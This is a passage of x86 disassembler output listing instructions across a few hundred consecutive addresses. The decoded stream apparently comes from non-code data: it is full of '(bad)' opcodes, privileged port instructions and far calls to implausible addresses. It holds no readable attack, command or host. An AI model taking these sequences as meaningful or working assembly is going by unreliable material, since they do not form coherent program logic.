  41f7d7:	cmp    al,0x23
  41f7d9:	jle    0x41f78a
  41f7db:	jg     0x41f7bc
  41f7dd:	cld    
  41f7de:	call   0xb4e6:0xcd6c62d2
  41f7e5:	jp     0x41f84e
  41f7e7:	push   edx
  41f7e8:	add    DWORD PTR [eax],eax
  41f7ea:	add    BYTE PTR [ecx],al
  41f7ec:	add    BYTE PTR [eax],al
  41f7ee:	fisubr DWORD PTR [esp+ebp*8-0x2eb88279]
  41f7f5:	lock ins DWORD PTR es:[edi],dx
  41f7f7:	dec    esi
  41f7f8:	and    eax,0x772b215c
  41f7fd:	imul   ecx,DWORD PTR ds:0x2c54ab73,0xfffffff9
  41f804:	dec    ebp
  41f805:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41f806:	in     eax,dx
  41f807:	jle    0x41f854
  41f809:	jmp    0x84234c52
  41f80e:	imul   ebp,ebp,0x4b
  41f811:	cmc    
  41f812:	sbb    ebx,esp
  41f814:	add    esp,DWORD PTR [ebx]
  41f816:	outs   dx,BYTE PTR ds:[esi]
  41f817:	and    BYTE PTR [edx],bh
  41f819:	enter  0x1b33,0xca
  41f81d:	js     0x41f830
  41f81f:	adc    BYTE PTR [esi],cl
  41f821:	jp     0x41f89e
  41f823:	and    eax,0xb20c2c99
  41f828:	mov    eax,ds:0x4c23f2d2
  41f82d:	hlt    
  41f82e:	sbb    eax,0x7f6c1e3
  41f833:	xchg   ecx,eax
  41f834:	sbb    ebx,esp
  41f836:	neg    ebx
  41f838:	add    al,0x32
  41f83a:	fbstp  TBYTE PTR [ecx]
  41f83c:	mov    al,ds:0x3573cf29
  41f841:	mov    ds:0xe2de09d0,eax
  41f846:	cld    
  41f847:	call   0xb5e:0x7e055343
  41f84e:	jmp    0xf777f900
  41f853:	bound  edx,QWORD PTR [eax]
  41f855:	scas   al,BYTE PTR es:[edi]
  41f856:	pop    es
  41f857:	sub    BYTE PTR [ebp-0x59],cl
  41f85a:	test   al,0xc2
  41f85c:	jno    0x41f7ff
  41f85e:	mov    dh,0x65
  41f860:	add    ebp,DWORD PTR [eax-0x7cbc06e8]
  41f866:	xor    bl,0x9d
  41f869:	lds    eax,FWORD PTR ds:0xa649e44a
  41f86f:	aaa    
  41f870:	aaa    
  41f871:	lahf   
  41f872:	and    eax,0xdad8e250
  41f877:	sbb    al,0x8f
  41f879:	adc    eax,0xa1869b99
  41f87e:	add    edi,edx
  41f880:	push   es
  41f881:	push   ss
  41f882:	scas   eax,DWORD PTR es:[edi]
  41f883:	fcmovnb st,st(3)
  41f885:	sbb    al,0x85
  41f887:	pop    ebp
  41f888:	repz add eax,esp
  41f88b:	pop    ebp
  41f88c:	push   es
  41f88d:	not    BYTE PTR [ebx+0x291b30db]
  41f893:	xchg   edi,eax
  41f894:	aaa    
  41f895:	out    dx,eax
  41f896:	mov    edi,0xc50e89ee
  41f89b:	cli    
  41f89c:	ret    
  41f89d:	ja     0x41f8f1
  41f89f:	sbb    DWORD PTR [ecx+0x6],ecx
  41f8a2:	xchg   eax,esp
  41f8a4:	mov    eax,0x613bdda4
  41f8a9:	cmp    eax,0x55dd119b
  41f8ae:	xchg   esi,eax
  41f8af:	xor    DWORD PTR [edx+ebp*8+0x4b],edx
  41f8b3:	arpl   WORD PTR [edx],cx
  41f8b5:	aam    0x65
  41f8b7:	loopne 0x41f8c2
  41f8b9:	or     ebp,DWORD PTR [ebx-0x4f]
  41f8bc:	jg     0x41f924
  41f8be:	in     al,0x2b
  41f8c0:	lock rol DWORD PTR [esi-0x39d8d34c],cl
  41f8c7:	test   eax,0xdbca02c6
  41f8cc:	jmp    0x41f8e3
  41f8ce:	mov    ah,0x5c
  41f8d0:	dec    ecx
  41f8d1:	jecxz  0x41f938
  41f8d3:	cmc    
  41f8d4:	aaa    
  41f8d5:	mov    bl,0xa1
  41f8d7:	scas   eax,DWORD PTR es:[edi]
  41f8d8:	mov    esp,0xc255ebcf
  41f8dd:	aad    0x39
  41f8df:	adc    eax,0x7414dd94
  41f8e4:	mov    ebp,0x6cf52d6e
  41f8e9:	jmp    0x41f961
  41f8eb:	xor    esi,DWORD PTR [ecx+ebx*1+0x0]
	...
  41f956:	mov    eax,ds:0x3b920b9a
  41f95b:	xchg   ebx,eax
  41f95c:	mov    ecx,0x4183febb
  41f961:	pop    edx
  41f962:	sbb    DWORD PTR [esp+eax*8-0x6a],eax
  41f966:	addr16 push ebx
  41f968:	add    DWORD PTR [eax],eax
  41f96a:	add    BYTE PTR [ecx],al
  41f96c:	add    BYTE PTR [eax],al
  41f96e:	push   eax
  41f96f:	cdq    
  41f970:	push   ss
  41f971:	sub    al,0x35
  41f973:	call   0x2f89:0x40536e93
  41f97a:	sbb    dl,0xd2
  41f97d:	movhps QWORD PTR [ebx],xmm0
  41f980:	adc    eax,0x84f43545
  41f985:	scas   eax,DWORD PTR es:[edi]
  41f986:	inc    edi
  41f987:	inc    esi
  41f988:	sbb    ebp,DWORD PTR [edx-0x6dfd2ddf]
  41f98e:	fwait
  41f98f:	nop
  41f990:	mov    al,0xe8
  41f992:	cwde   
  41f993:	inc    esi
  41f994:	addr16 mov ds:0x3c40,al
  41f998:	mov    ds,WORD PTR [edx]
  41f99a:	xchg   edx,eax
  41f99b:	in     al,0x11
  41f99d:	inc    ebp
  41f99e:	cmp    dl,bh
  41f9a0:	jns    0x41f9f2
  41f9a2:	jns    0x41f96c
  41f9a4:	mov    ah,0x8b
  41f9a6:	les    ecx,FWORD PTR [ecx+0x3c]
  41f9a9:	push   ds
  41f9aa:	sbb    esi,DWORD PTR [edi+0x5f613341]
  41f9b0:	dec    esp
  41f9b1:	push   ss
  41f9b2:	scas   al,BYTE PTR es:[edi]
  41f9b3:	jnp    0x41f99a
  41f9b5:	bound  esi,QWORD PTR [esi+ebx*1-0x561e2178]
  41f9bc:	das    
  41f9bd:	or     eax,0xd0a84cb9
  41f9c2:	xor    bl,cl
  41f9c4:	mov    bh,0xf9
  41f9c6:	sub    DWORD PTR [esi-0x342b63c9],esp
  41f9cc:	sti    
  41f9cd:	int3   
  41f9ce:	xchg   edx,eax
  41f9cf:	jp     0x41f98c
  41f9d1:	push   edi
  41f9d2:	push   cs
  41f9d3:	int    0x91
  41f9d5:	xchg   ecx,eax
  41f9d6:	mov    esi,0x94468040
  41f9db:	cmove  ebx,eax
  41f9de:	mov    ds:0x4f895c5f,al
  41f9e3:	xor    eax,0x561e66d6
  41f9e8:	in     eax,0x89
  41f9ea:	pop    esi
  41f9eb:	retw   
  41f9ed:	mov    al,0x60
  41f9ef:	xchg   ebp,eax
  41f9f0:	shl    BYTE PTR [ebp+0x2e],1
  41f9f3:	mov    edi,0x4b48678a
  41f9f8:	add    al,0x33
  41f9fa:	or     DWORD PTR [edx-0x7e],eax
  41f9fd:	(bad)  
  41f9ff:	sub    al,0xfe
  41fa01:	or     esi,esp
  41fa03:	inc    ebx
  41fa04:	xchg   ebx,eax
  41fa05:	xor    edi,DWORD PTR [esi-0x3]
  41fa08:	in     al,dx
  41fa09:	pop    ebx
  41fa0a:	mov    BYTE PTR [eax],dh
  41fa0c:	dec    eax
  41fa0d:	sub    eax,0x841bb44d
  41fa13:	add    ecx,ebp
  41fa15:	icebp  
  41fa16:	sbb    eax,0x8dee077a
  41fa1b:	cli    
  41fa1c:	inc    edx
  41fa1d:	jb     0x41fa68
  41fa1f:	push   0x2a
  41fa21:	clc    
  41fa22:	mov    ecx,DWORD PTR [edx-0xbf987b9]
  41fa28:	inc    ebx
  41fa29:	xor    DWORD PTR [ebp+0x281cc3b3],ebx
  41fa2f:	adc    BYTE PTR [edi+0x66171d6a],ah
  41fa35:	call   0x23c8:0x361f9bd8
  41fa3c:	not    DWORD PTR [edx+0x69]
  41fa3f:	(bad)  
  41fa40:	and    BYTE PTR [edx+0x45667f9a],ah
  41fa46:	jns    0x41f9c8
  41fa48:	adc    ax,0x400f
  41fa4c:	jmp    0xf0a7bbb7
  41fa51:	sbb    ebp,ebx
  41fa53:	rol    BYTE PTR [eax-0x40679b23],cl
  41fa59:	xchg   ecx,eax
  41fa5a:	jle    0x41fa3c
  41fa5c:	test   BYTE PTR [edx],dh
  41fa5e:	xchg   ecx,eax
  41fa5f:	icebp  
  41fa60:	clc    
  41fa61:	push   ebx
  41fa62:	pop    esp
  41fa63:	inc    ebp
  41fa64:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fa65:	push   edi
  41fa66:	fisub  DWORD PTR [edi+0x6f3124f3]
  41fa6c:	mov    al,0x30
	...
  41fad6:	or     al,BYTE PTR [ecx-0x49]
  41fad9:	mov    eax,ds:0xeb1ef7ff
  41fade:	and    edx,DWORD PTR [edi-0x5d]
  41fae1:	adc    eax,0x82862767
  41fae6:	addr16 push esp
  41fae8:	add    DWORD PTR [eax],eax
  41faea:	add    BYTE PTR [ecx],al
  41faec:	add    BYTE PTR [eax],al
  41faee:	repz dec eax
  41faf0:	jbe    0x41fb3b
  41faf2:	(bad)  
  41faf3:	out    dx,al
  41faf4:	in     eax,0x7c
  41faf6:	iret   
  41faf7:	and    al,0x34
  41faf9:	aam    0xe2
  41fafb:	or     eax,0x2e7664e
  41fb00:	fwait
  41fb01:	adc    DWORD PTR [eax-0x7e5798c4],0xffffffa4
  41fb08:	mov    esp,DWORD PTR [ebp+0x707211b8]
  41fb0e:	cmp    BYTE PTR [ecx-0x3c721c97],ch
  41fb14:	stos   DWORD PTR es:[di],eax
  41fb16:	(bad)  
  41fb17:	in     al,dx
  41fb18:	mul    BYTE PTR [esi-0x58b17d60]
  41fb1e:	xor    bh,BYTE PTR [edi-0x4a]
  41fb21:	(bad)  
  41fb22:	or     eax,ebx
  41fb24:	jmp    0x41fab9
  41fb26:	in     eax,dx
  41fb27:	retf   
  41fb28:	dec    esi
  41fb29:	out    0xff,eax
  41fb2b:	in     al,dx
  41fb2c:	stc    
  41fb2d:	(bad)  
  41fb2e:	xchg   ebx,eax
  41fb2f:	push   0xd461043e
  41fb34:	sub    BYTE PTR [ebp-0x68],0xaf
  41fb38:	das    
  41fb39:	mov    ecx,0xe5e4d5c6
  41fb3e:	xchg   BYTE PTR [edi+0x4534be3],ch
  41fb44:	lods   al,BYTE PTR ds:[esi]
  41fb45:	mov    al,ds:0xec1429a5
  41fb4a:	jge    0x41fbbe
  41fb4c:	lods   al,BYTE PTR ds:[esi]
  41fb4d:	imul   ecx,DWORD PTR [ebx+0x3a],0xed06d361
  41fb54:	inc    eax
  41fb55:	or     al,0x47
  41fb57:	or     ecx,DWORD PTR [ecx+0x789f7462]
  41fb5d:	mov    dl,0x50
  41fb5f:	(bad)  
  41fb60:	mov    ch,0xbd
  41fb62:	rcr    DWORD PTR [eax],cl
  41fb64:	test   BYTE PTR [esi+0x3f42f1cc],ah
  41fb6a:	lods   al,BYTE PTR ds:[esi]
  41fb6b:	sbb    al,0x14
  41fb6d:	fwait
  41fb6e:	rol    DWORD PTR [eax+0x49],cl
  41fb71:	push   ds
  41fb72:	ds call 0x9cea:0x3f70eca7
  41fb7a:	inc    eax
  41fb7b:	popa   
  41fb7c:	sbb    al,0xcf
  41fb7e:	xor    al,0xa6
  41fb80:	add    DWORD PTR [ebx],ecx
  41fb82:	push   0x52e91371
  41fb87:	ror    cl,1
  41fb89:	dec    edi
  41fb8a:	shld   DWORD PTR [edx],edi,cl
  41fb8d:	fidivr WORD PTR [edx]
  41fb8f:	hlt    
  41fb90:	sti    
  41fb91:	push   0xffffff8b
  41fb93:	inc    BYTE PTR [eax]
  41fb95:	adc    eax,0x2bc5e7ef
  41fb9a:	push   0xc5c5e170
  41fb9f:	cmp    DWORD PTR [edi+0x6601647e],ebx
  41fba5:	enter  0xc6e3,0x7f
  41fba9:	xchg   ecx,eax
  41fbaa:	and    al,0x19
  41fbac:	jo     0x41fbea
  41fbae:	mov    esi,0xd0f03ea6
  41fbb3:	or     BYTE PTR [edi+ecx*1-0x62893814],0xba
  41fbbb:	repz lock push eax
  41fbbe:	cmp    edi,DWORD PTR [esi+0xa]
  41fbc1:	fnclex 
  41fbc3:	xor    al,0x3e
  41fbc5:	inc    ecx
  41fbc6:	adc    esp,edx
  41fbc8:	push   esi
  41fbc9:	sub    eax,0x6a544802
  41fbce:	xchg   DWORD PTR [eax+0x11184735],edi
  41fbd4:	call   0xbea51dd4
  41fbd9:	jge    0x41fc07
  41fbdb:	ficom  DWORD PTR [ecx]
  41fbdd:	(bad)  
  41fbde:	sbb    BYTE PTR [ecx+0x54bc2442],dl
  41fbe4:	jge    0x41fc3e
  41fbe6:	or     dl,BYTE PTR [ecx]
  41fbe8:	sub    al,0x27
  41fbea:	loope  0x41fbd2
  41fbec:	pop    edx
  41fbed:	pop    esp
	...
  41fc56:	fsubr  QWORD PTR [eax]
  41fc58:	mov    ah,ah
  41fc5a:	(bad)  
  41fc5b:	out    0xfe,al
  41fc5d:	cmp    BYTE PTR [esi],ah
  41fc5f:	ret    
  41fc60:	or     DWORD PTR [esi],edx
  41fc62:	push   eax
  41fc63:	xchg   ebp,eax
  41fc64:	mov    ecx,0x15567a9
  41fc69:	add    BYTE PTR [eax],al
  41fc6b:	add    DWORD PTR [eax],eax
  41fc6d:	add    BYTE PTR [ebp-0x41],dh
  41fc70:	or     ch,BYTE PTR [eax]
  41fc72:	xor    bl,ch
  41fc74:	daa    
  41fc75:	mov    bl,0x86
  41fc77:	ins    DWORD PTR es:[edi],dx
  41fc78:	fsubr  st,st(2)
  41fc7a:	pop    ebp
  41fc7b:	lahf   
  41fc7c:	sub    eax,0x990d59d2
  41fc81:	iret   
  41fc82:	inc    esi
  41fc83:	icebp  
  41fc84:	inc    esp
  41fc85:	push   ebp
  41fc86:	and    BYTE PTR [eax],ch
  41fc88:	je     0x41fc11
  41fc8a:	xor    eax,0xbd1a461
  41fc8f:	sar    edi,1
  41fc91:	push   esi
  41fc92:	imul   BYTE PTR [eax-0x51]
  41fc95:	or     al,0x86
  41fc97:	add    eax,0x324a135
  41fc9c:	gs sahf 
  41fc9e:	ror    BYTE PTR [esi+ecx*2+0x6c],cl
  41fca2:	addr16 test al,0x7e
  41fca5:	(bad)  
  41fca6:	push   ebx
  41fca7:	into   
  41fca8:	mul    BYTE PTR ds:0xf5da4500
  41fcae:	pop    edx
  41fcaf:	jge    0x41fca6
  41fcb1:	add    eax,0x3e496846
  41fcb6:	cmp    al,BYTE PTR [ebp-0x168a2721]
  41fcbc:	outs   dx,BYTE PTR ds:[esi]
  41fcbd:	frstor [ecx-0x2788570a]
  41fcc3:	retf   0x5199
  41fcc6:	cmp    ebp,edx
  41fcc8:	(bad)  
  41fcc9:	fcmovb st,st(4)
  41fccb:	pop    esi
  41fccc:	in     al,dx
  41fccd:	xor    al,0xbe
  41fccf:	call   0x9abe432a
  41fcd4:	or     eax,0xbd81ed7b
  41fcd9:	imul   esi,DWORD PTR [ecx+edx*1+0x3f8a53ca],0x51
  41fce1:	lock mov dh,BYTE PTR [esi-0x4c]
  41fce5:	jle    0x41fc8c
  41fce7:	mov    ?,WORD PTR [esp-0x36]
  41fceb:	in     al,0x3e
  41fced:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41fcef:	scas   al,BYTE PTR es:[edi]
  41fcf0:	sub    edx,ecx
  41fcf2:	fwait
  41fcf3:	jmp    0xdfe3:0x97cdec68
  41fcfa:	pop    es
  41fcfb:	sbb    eax,0x81be3f72
  41fd00:	and    al,BYTE PTR [edi]
  41fd02:	ret    
  41fd03:	stos   BYTE PTR es:[edi],al
  41fd04:	ins    BYTE PTR es:[edi],dx
  41fd05:	dec    eax
  41fd06:	jecxz  0x41fca7
  41fd08:	ins    BYTE PTR es:[edi],dx
  41fd09:	adc    BYTE PTR [ecx+0xcc4f064],cl
  41fd0f:	xor    ecx,DWORD PTR [edi-0x5b5ec820]
  41fd15:	mov    ebx,0xca1f68b5
  41fd1a:	loopne 0x41fcd1
  41fd1c:	xchg   ebp,eax
  41fd1d:	cmc    
  41fd1e:	imul   BYTE PTR [eax-0x1b]
  41fd21:	js     0x41fcb7
  41fd23:	out    dx,al
  41fd24:	pop    ds
  41fd25:	int3   
  41fd26:	add    bx,si
  41fd29:	cs push cs
  41fd2b:	mov    ds:0xf4e8244e,eax
  41fd30:	jo     0x41fcca
  41fd32:	jno    0x41fd7a
  41fd34:	(bad)  
  41fd35:	jmp    0xbf1ace5d
  41fd3a:	(bad)  
  41fd3b:	stc    
  41fd3c:	lock sbb dh,BYTE PTR [ebx+edi*4-0x54633d39]
  41fd44:	pop    esp
  41fd45:	mov    ebp,0x3381e211
  41fd4a:	xor    BYTE PTR [eax+esi*2-0x2b],al
  41fd4e:	add    BYTE PTR [edi],bh
  41fd50:	sub    dh,BYTE PTR ds:0xfa8dafc4
  41fd56:	cli    
  41fd57:	stos   BYTE PTR es:[edi],al
  41fd58:	sahf   
  41fd59:	imul   ecx,DWORD PTR es:[ebp-0x7a5ee7b1],0xecbcff08
  41fd64:	jns    0x41fd73
  41fd66:	popa   
  41fd67:	mov    ebx,0x2ce99772
  41fd6c:	jl     0x41fd8e
	...
  41fdd6:	or     al,0x6a
  41fdd8:	push   edx
  41fdd9:	shl    DWORD PTR [esi-0x7],0x9f
  41fddd:	out    dx,eax
  41fdde:	pop    ds
  41fddf:	pop    edx
  41fde0:	pushf  
  41fde1:	push   ss
  41fde2:	cmp    eax,0x678b95d2
  41fde7:	push   esi
  41fde8:	add    DWORD PTR [eax],eax
  41fdea:	add    BYTE PTR [ecx],al
  41fdec:	add    BYTE PTR [eax],al
  41fdee:	xor    DWORD PTR [ebx-0x9],ebx
  41fdf1:	not    bl
  41fdf3:	mov    edi,0x49b787e
  41fdf8:	cmp    al,0x2f
  41fdfa:	test   DWORD PTR [ecx],esi
  41fdfc:	int3   
  41fdfd:	push   ds
  41fdfe:	retf   0xadcb
  41fe01:	arpl   WORD PTR [eax],dx
  41fe03:	call   DWORD PTR [edi+0x504ee8af]
  41fe09:	popa   
  41fe0a:	lds    ebp,FWORD PTR [ecx+0x330d197f]
  41fe10:	mov    ds,ebx
  41fe12:	jb     0x41fe93
  41fe14:	in     eax,dx
  41fe15:	cmp    esi,esi
  41fe17:	imul   esp,ecx,0xffffff96
  41fe1a:	pop    esp
  41fe1b:	sub    eax,0x90efe27d
  41fe20:	mov    edx,0x42a15058
  41fe25:	aaa    
  41fe26:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fe27:	mov    WORD PTR [ecx],ds
  41fe29:	add    BYTE PTR [ebp-0x5360c839],dl
  41fe2f:	shr    DWORD PTR [ecx+0x30a5c611],1
  41fe35:	sub    BYTE PTR [eax],0x6b
  41fe38:	loopne 0x41fe56
  41fe3a:	add    BYTE PTR ds:0x2667b00b,ah
  41fe40:	sahf   
  41fe41:	pushf  
  41fe42:	mov    bh,0x59
  41fe44:	mov    eax,0xb83afbc2
  41fe49:	jmp    0x41fe4f
  41fe4b:	xchg   edx,eax
  41fe4c:	repz jbe 0x41fe0e
  41fe4f:	into   
  41fe50:	jne    0x41fe65
  41fe52:	je     0x41fe39
  41fe54:	retf   0xeae1
  41fe57:	test   BYTE PTR [edi],cl
  41fe59:	fidiv  DWORD PTR [ebx]
  41fe5b:	fidivr DWORD PTR [edx+0x7b]
  41fe5e:	jge    0x41feaa
  41fe60:	loope  0x41febf
  41fe62:	mov    al,ds:0xf9b65cd1
  41fe67:	pop    ecx
  41fe68:	cmp    al,BYTE PTR [ebx-0x2e19b750]
  41fe6e:	in     eax,dx
  41fe6f:	sub    ebx,esp
  41fe71:	mov    dh,0x58
  41fe73:	pop    eax
  41fe74:	mov    DWORD PTR [ecx+eax*4-0x6],ecx
  41fe78:	fimul  DWORD PTR [esi]
  41fe7a:	inc    ebx
  41fe7b:	inc    eax
  41fe7c:	outs   dx,DWORD PTR ss:[esi]
  41fe7e:	call   0x63b9:0x5a018b57
  41fe85:	mov    ebp,0xbdfb02dd
  41fe8a:	loope  0x41fe6c
  41fe8c:	push   ecx
  41fe8d:	(bad)  
  41fe8e:	ins    BYTE PTR es:[edi],dx
  41fe8f:	mov    ds:0xccf7454f,al
  41fe94:	push   ebp
  41fe95:	imul   edx,DWORD PTR [ecx-0x174ec703],0x34011c5c
  41fe9f:	not    BYTE PTR [ecx-0x11fd739e]
  41fea5:	int    0x68
  41fea7:	xchg   ecx,eax
  41fea8:	retf   
  41fea9:	xchg   ecx,eax
  41feaa:	leave  
  41feab:	xor    eax,DWORD PTR [ecx]
  41fead:	mov    edx,0x83d40942
  41feb2:	nop
  41feb3:	rol    DWORD PTR [ecx-0x435f42b0],1
  41feb9:	aad    0xd0
  41febb:	mov    es,WORD PTR [edi+0x4cc53baf]
  41fec1:	sub    bl,ch
  41fec3:	lds    ebx,FWORD PTR ds:0x63527dab
  41fec9:	pop    ss
  41feca:	push   ecx
  41fecb:	add    ebp,ebx
  41fecd:	pop    es
  41fece:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41fecf:	jle    0x41fe8d
  41fed1:	sub    DWORD PTR [ebp-0x41],ecx
  41fed4:	inc    esi
  41fed5:	jge    0x41febb
  41fed7:	iret   
  41fed8:	xchg   esp,eax
  41fed9:	dec    esp
  41feda:	test   al,0xfb
  41fedc:	cld    
  41fedd:	mov    ds:0x8273eebb,eax
  41fee2:	out    dx,eax
  41fee3:	in     eax,0xc8
  41fee5:	sbb    ebx,esi
  41fee7:	jne    0x41ff5c
  41fee9:	add    DWORD PTR [ebp+edx*8+0x57],ebx
  41feed:	push   ebx
	...
  41ff56:	stos   BYTE PTR es:[edi],al
  41ff57:	push   ebp
  41ff58:	call   0xfb5d:0xffefffe7
  41ff5f:	(bad)  
  41ff60:	hlt    
  41ff61:	mov    ah,0x99
  41ff63:	xchg   ebx,eax
  41ff64:	jle    0x41ff98
  41ff66:	addr16 push edi
  41ff68:	add    DWORD PTR [eax],eax
  41ff6a:	add    BYTE PTR [ecx],al
  41ff6c:	add    BYTE PTR [eax],al
  41ff6e:	in     eax,dx
  41ff6f:	jbe    0x41ff9a
  41ff71:	push   0x55
  41ff73:	loopne 0x41ffab
  41ff75:	ret    0xda18
  41ff78:	mov    ecx,DWORD PTR [ebx-0x62389163]
  41ff7e:	mov    ah,0x62
  41ff80:	(bad)  
  41ff81:	cmp    cl,BYTE PTR [edx]
  41ff83:	cmp    esp,0xffffff96
  41ff86:	pop    es
  41ff87:	bound  edi,QWORD PTR [eax+0x60fe176]
  41ff8d:	dec    ebx
  41ff8e:	test   eax,0xf0b1eca9
  41ff93:	push   edi
  41ff94:	adc    edx,DWORD PTR [esi-0x45]
  41ff97:	call   0xe4d9:0xbf0bb6e
  41ff9e:	add    eax,0xa405f28f
  41ffa3:	icebp  
  41ffa4:	adc    al,0x1c
  41ffa6:	sbb    al,0xbb
  41ffa8:	and    al,0xda
  41ffaa:	pop    ebp
  41ffab:	test   eax,0x9841efa9
  41ffb0:	jmp    DWORD PTR [ecx-0x38283698]
  41ffb6:	jle    0x41ff46
  41ffb8:	push   0xffffff9d
  41ffba:	cwde   
  41ffbb:	mov    bl,0xe5
  41ffbd:	push   esp
  41ffbe:	sub    eax,0xc411b9a1
  41ffc3:	in     eax,dx
  41ffc4:	xchg   BYTE PTR [eax+0x71680d0],ah
  41ffca:	mov    WORD PTR [eax],cs
  41ffcc:	add    ebx,DWORD PTR [ebp+ebx*2+0x43]
  41ffd0:	out    dx,eax
  41ffd1:	imul   DWORD PTR [esi-0x4b55a097]
  41ffd7:	sbb    esp,DWORD PTR [esp+esi*2]
  41ffda:	xchg   esp,eax
  41ffdb:	es dec eax
  41ffdd:	xchg   edi,eax
  41ffde:	repnz dec edx
  41ffe0:	in     eax,dx
  41ffe1:	test   al,0xb9
  41ffe3:	dec    ecx
  41ffe4:	ret    0x7368
  41ffe7:	jg     0x42004b
  41ffe9:	daa    
  41ffea:	pop    ebx
  41ffeb:	test   DWORD PTR [eax],ecx
  41ffed:	cmp    eax,0x93bebe55
  41fff2:	push   ds
  41fff3:	test   DWORD PTR [ebp-0x4e4f2bdd],eax
  41fff9:	mov    dh,0x66
  41fffb:	push   DWORD PTR [ecx+0x1e]
  41fffe:	jl     0x420075
  420000:	(bad)  
  420001:	test   bl,al
  420003:	push   ss
  420004:	push   edx
  420005:	xrelease xchg BYTE PTR [eax],al
  420008:	nop
  420009:	mov    WORD PTR [esi],es
  42000b:	add    eax,0x80f10c4
  420010:	into   
  420011:	mov    eax,0x404cdce4
  420016:	adc    eax,0xec117147
  42001b:	test   eax,0x3f2705b1
  420020:	mov    ebx,DWORD PTR [eax]
  420022:	ret    
  420023:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420024:	sub    BYTE PTR [eax],bh
  420026:	retf   
  420027:	jmp    0x46b9b23
  42002c:	ret    0x3d74
  42002f:	sub    bh,cl
  420031:	xlat   BYTE PTR ds:[ebx]
  420032:	mov    dl,0x51
  420034:	mov    edx,0x4e672ff8
  420039:	xchg   esi,eax
  42003a:	adc    DWORD PTR [eax-0x72],esp
  42003d:	jle    0x420045
  42003f:	lea    esp,[ecx]
  420041:	sbb    edx,DWORD PTR [ebx+0x152272a8]
  420047:	ret    
  420048:	ins    BYTE PTR es:[edi],dx
  420049:	in     al,0x75
  42004b:	mov    bl,0x54
  42004d:	mov    ebx,0xecdb7578
  420052:	jge    0x4200d3
  420054:	xchg   edi,eax
  420055:	cmp    ah,BYTE PTR [esi+0x4e6abbfb]
  42005b:	mov    dl,0x63
  42005d:	test   al,0x61
  42005f:	mov    ecx,0x8d03060f
  420064:	fnsave [eax+0x54]
  420067:	jne    0x4200b1
  420069:	jp     0x420083
  42006b:	mov    eax,0xcc52
	...
  4200d4:	add    BYTE PTR [eax],al
  4200d6:	bound  esp,QWORD PTR [ebp-0x8808a]
  4200dc:	imul   edi,DWORD PTR [ebp-0x6d81eb08],0x47
  4200e3:	xchg   ebp,eax
  4200e4:	jns    0x42010b
  4200e6:	addr16 pop eax
  4200e8:	add    DWORD PTR [eax],eax
  4200ea:	add    BYTE PTR [ecx],al
  4200ec:	add    BYTE PTR [eax],al
  4200ee:	inc    ebx
  4200ef:	inc    BYTE PTR [ecx+esi*4]
  4200f2:	cmc    
  4200f3:	rcr    BYTE PTR [ebx+eax*1],1
  4200f6:	pop    es
  4200f7:	ss pop esp
  4200f9:	jmp    0xa7ce08e3
  4200fe:	dec    ebp
  4200ff:	adc    al,0x87
  420101:	repz sbb BYTE PTR [ecx+0x150e9cf2],dh
  420108:	or     cl,BYTE PTR [edi+edx*4+0x34]
  42010c:	clc    
  42010d:	out    dx,al
  42010e:	mov    ah,0xa1
  420110:	stos   BYTE PTR es:[edi],al
  420111:	test   al,0xd1
  420113:	mov    esp,DWORD PTR [edi]
  420115:	jp     0x42016f
  420117:	emms   
  420119:	ins    DWORD PTR es:[edi],dx
  42011a:	mov    ah,0xa1
  42011c:	dec    ebp
  42011d:	iret   
  42011e:	std    
  42011f:	sahf   
  420120:	push   ebx
  420121:	in     eax,dx
  420122:	mov    ch,0x58
  420124:	out    dx,eax
  420125:	jnp    0x42018e
  420127:	inc    edi
  420128:	add    ch,BYTE PTR [ebp+0x375bdba4]
  42012e:	xor    esp,DWORD PTR [ecx+eax*1+0x53efd4ce]
  420135:	fcmovu st,st(6)
  420137:	and    BYTE PTR [edi],bl
  420139:	push   esi
  42013a:	inc    edi
  42013b:	cmp    eax,0xeb1e0f04
  420140:	push   ds
  420141:	rcl    DWORD PTR [eax],0x31
  420144:	add    al,0xcc
  420146:	pop    esi
  420147:	or     BYTE PTR [edx],cl
  420149:	xchg   BYTE PTR [eax+eiz*2],bl
  42014c:	addr16 inc edx
  42014e:	sub    BYTE PTR [edi+0x1f],bl
  420151:	add    edx,DWORD PTR [edx+esi*2-0x26]
  420155:	and    DWORD PTR [esi],edi
  420157:	push   edi
  420158:	adc    esp,DWORD PTR [eax]
  42015a:	dec    eax
  42015b:	popf   
  42015c:	imul   esi,DWORD PTR [edx+edi*8-0x5],0x5e9f0c15
  420164:	out    dx,eax
  420165:	jb     0x4201a4
  420167:	(bad)  
  420168:	mov    bh,0x82
  42016a:	sbb    al,0x8f
  42016c:	clc    
  42016d:	inc    edi
  42016e:	cmp    ebx,DWORD PTR [edi]
  420170:	push   edi
  420171:	xor    al,0x85
  420173:	addr16 (bad) 
  420175:	or     eax,0xf9cd31a2
  42017a:	fwait
  42017b:	lds    edi,FWORD PTR [esp+eax*4+0x1]
  42017f:	scas   eax,DWORD PTR es:[edi]
  420180:	out    dx,eax
  420181:	aaa    
  420182:	aas    
  420183:	not    BYTE PTR [edx]
  420185:	aad    0x6f
  420187:	stos   DWORD PTR es:[edi],eax
  420188:	sub    DWORD PTR [edi+edx*1+0x62],ebp
  42018c:	jmp    0x66ab:0xe675e950
  420193:	push   es
  420194:	jp     0x4201a2
  420196:	(bad)  
  420197:	mov    esp,DWORD PTR ds:0xb5de7ba2
  42019d:	jno    0x420194
  42019f:	push   0x8247e3ad
  4201a4:	pop    ebx
  4201a5:	adc    bh,BYTE PTR [esi]
  4201a7:	arpl   WORD PTR [ebp+0x61a4f7a1],di
  4201ad:	sub    DWORD PTR [ecx+0x49],ebx
  4201b0:	and    esi,DWORD PTR [eax]
  4201b2:	mov    ch,0x8d
  4201b4:	mov    cl,dh
  4201b6:	jno    0x4201df
  4201b8:	retf   
  4201b9:	sub    eax,0xdddeb16f
  4201be:	add    ebx,ebp
  4201c0:	lods   al,BYTE PTR ds:[esi]
  4201c1:	cmp    al,0x1d
  4201c3:	fwait
  4201c4:	inc    ecx
  4201c5:	xchg   ecx,eax
  4201c6:	pop    ds
  4201c7:	sub    ch,BYTE PTR ds:0xad25f0e2
  4201cd:	or     DWORD PTR ds:0x9e9c58f7,eax
